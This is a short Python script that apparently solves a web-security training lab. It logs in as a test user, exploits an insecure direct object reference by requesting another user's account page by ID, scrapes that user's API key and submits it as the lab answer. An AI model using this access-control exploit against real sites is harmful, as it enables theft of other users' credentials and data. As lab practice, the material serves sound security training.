import requests
import sys
import urllib3
import re
from bs4 import BeautifulSoup
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

def get_csrf_token(session, url):
    print("(+) Fetching csrf token ...")
    response = session.get(url+"/login" , verify=False)
    soup = BeautifulSoup(response.text, "html.parser")
    csrf_token = soup.find("input",{"name":"csrf"})["value"]
    return csrf_token


def exploit_account(session , url):
    csrf_token = get_csrf_token(session, url)
    print("(+) Attempting to Login ..")
    login_data = {
        "username":"wiener",
        "password":"peter",
        "csrf":csrf_token

    }
    login_url = url+"/login"
    reponse = session.post(url=login_url , data=login_data, verify=False)
    if "Log out" in reponse.text:
        print("(+) Login Successfully ...")
        cookie = reponse.cookies.get_dict().get('session')
        carlos_account = url+"/my-account?id=carlos"
        response = requests.get(carlos_account , cookies=cookie , verify=False ,allow_redirects=False)
        if "carlos" in response.text:
            api_key = re.search("Your API Key is:(.*)",response.text).group(1)
            api_key = api_key.split("</div>")[0].strip()
            print(f"(+) Extracted API Key: {api_key}")
            submit_url = url +"/submitSolution"
            data = {
                "answer":api_key
                }
            r = session.post(submit_url, data=data , verify=False)
            if "true" in r.text:
                print(f"(+) Congratulations, you solved the lab!")
            else:
                print("(-) Error in submitting api keys")
                sys.exit(-1)
        else:
            print("(+) Failed to Fetch API keys ..")
            sys.exit(-1)



def main():
    if len(sys.argv) != 2:
        print("(+) Usage: %s <url>"% sys.argv[0])
        print("(+) Example: %s www.example.com"% sys.argv[0])
    url = sys.argv[1]
    session = requests.Session()
    print("Validating the Target ..")
    response = session.get(url)
    if response.status_code ==200:
        print("(+) Target is Reachable ")
    else:
        print("(-) Target is Unreachable")
        sys.exit(-1)
    
    exploit_account(session , url)


if __name__ == "__main__":
    main()